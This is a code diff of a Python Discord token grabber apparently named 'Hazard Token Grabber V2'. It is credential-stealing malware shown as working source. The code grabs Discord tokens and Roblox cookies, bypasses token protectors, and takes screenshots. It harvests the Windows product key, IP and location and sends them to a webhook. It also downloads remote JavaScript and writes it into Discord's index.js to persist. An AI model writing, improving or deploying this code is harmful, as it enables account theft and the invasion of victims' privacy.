@@ -65,7 +65,7 @@ class functions(object):
             return "Failed to decrypt password"
 
     @staticmethod
-    def config(e: str):
+    def config(e: str) -> str or bool | None:
         return config.get(e)
 
 
@@ -89,7 +89,7 @@ class Hazard_Token_Grabber_V2(functions):
         self.tokens = []
         self.robloxcookies = []
 
-    def try_extract(self, func):
+    def try_extract(func):
         def wrapper(*args, **kwargs):
             try:
                 func(*args, **kwargs)
@@ -113,7 +113,7 @@ class Hazard_Token_Grabber_V2(functions):
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
-                         self.grabRobloxCookie, self.injector]
+                         self.grabRobloxCookie]
         if self.config('hide_self'):
             function_list.append(self.hide)
 
@@ -136,19 +136,7 @@ class Hazard_Token_Grabber_V2(functions):
             except RuntimeError:
                 continue
         self.neatifyTokens()
-        for i in os.listdir(self.dir):
-            if i.endswith('.txt'):
-                path = self.dir+self.sep+i
-                with open(path, "r", errors="ignore") as ff:
-                    x = ff.read()
-                    if not x:
-                        os.remove(path)
-                    with open(path, "w", encoding="utf-8") as f:
-                        f.write(
-                            "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
-                    with open(path, "a", encoding="utf-8") as fp:
-                        fp.write(
-                            x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
+        await self.injector()
         self.finish()
         shutil.rmtree(self.dir)
 
@@ -163,7 +151,7 @@ class Hazard_Token_Grabber_V2(functions):
         except Exception:
             pass
 
-    def injector(self):
+    async def injector(self):
         for _dir in os.listdir(self.appdata):
             if 'discord' in _dir.lower():
                 discord = self.appdata+self.sep+_dir
@@ -171,13 +159,17 @@ class Hazard_Token_Grabber_V2(functions):
                 for __dir in os.listdir(os.path.abspath(discord)):
                     if match(r'app-(\d*\.\d*)*', __dir):
                         app = os.path.abspath(disc_sep+__dir)
-                        inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js'
+                        inj_path = app+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\'
+                        try:
+                            os.mkdir(inj_path+'initiation')
+                        except FileExistsError:
+                            pass
                         if os.path.exists(inj_path):
                             f = httpx.get(self.config('injection_url')).text.replace(
                                 "%WEBHOOK%", self.webhook)
-                            with open(inj_path, 'w', errors="ignore") as indexFile:
+                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
-                            os.startfile(disc_sep+'Update.exe')
+                            os.startfile(app + self.sep + _dir + '.exe')
 
     def killDiscord(self):
         for proc in psutil.process_iter():
@@ -427,6 +419,22 @@ class Hazard_Token_Grabber_V2(functions):
         image.close()
 
     def finish(self):
+        for i in os.listdir(self.dir):
+            if i.endswith('.txt'):
+                path = self.dir+self.sep+i
+                with open(path, "r", errors="ignore") as ff:
+                    x = ff.read()
+                    if not x:
+                        try:
+                            os.remove(path)
+                        except PermissionError:
+                            pass
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(
+                            "🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                    with open(path, "a", encoding="utf-8") as fp:
+                        fp.write(
+                            x+"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")
         w = self.getProductValues()
         wname = w[0]
         wkey = w[1]
@@ -454,7 +462,7 @@ class Hazard_Token_Grabber_V2(functions):
         zipped_file.close()
         files_found = ''
         for f in os.listdir(self.dir):
-            files_found += f"{f}\n"
+            files_found += f"・{f}\n"
         tokens = ''
         for tkn in self.tokens:
             tokens += f'{tkn}\n\n'
@@ -475,30 +483,30 @@ class Hazard_Token_Grabber_V2(functions):
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                IP: {ip}
-                                Org: {org}
-                                City: {city}
-                                Region: {region}
-                                Country: {country}```
-                            ''',
+                                IP:᠎ {ip}
+                                Org:᠎ {org}
+                                City:᠎ {city}
+                                Region:᠎ {region}
+                                Country:᠎ {country}```
+                            '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '\u200b',
                             'value': f'''```fix
-                                PCName: {os.getenv('COMPUTERNAME')}
-                                WinKey: {wkey}
-                                Platform: {wname}
-                                DiskSpace: {disk}GB
-                                Ram: {ram}GB```
-                            ''',
+                                PCName: {os.getenv('COMPUTERNAME')}
+                                WinKey:᠎ {wkey}
+                                Platform:᠎ {wname}
+                                DiskSpace:᠎ {disk}GB
+                                Ram:᠎ {ram}GB```
+                            '''.replace(' ', ''),
                             'inline': True
                         },
                         {
                             'name': '**Tokens:**',
                             'value': f'''```yaml
                                 {tokens if tokens else "No tokens extracted"}``` 
-                            ''',
+                            '''.replace(' ', ''),
                             'inline': False
                         },
                         {
@@ -507,7 +515,7 @@ class Hazard_Token_Grabber_V2(functions):
                                 [
                                 {files_found.strip()}
                                 ]```
-                            ''',
+                            '''.replace(' ', ''),
                             'inline': False
                         }
                     ],
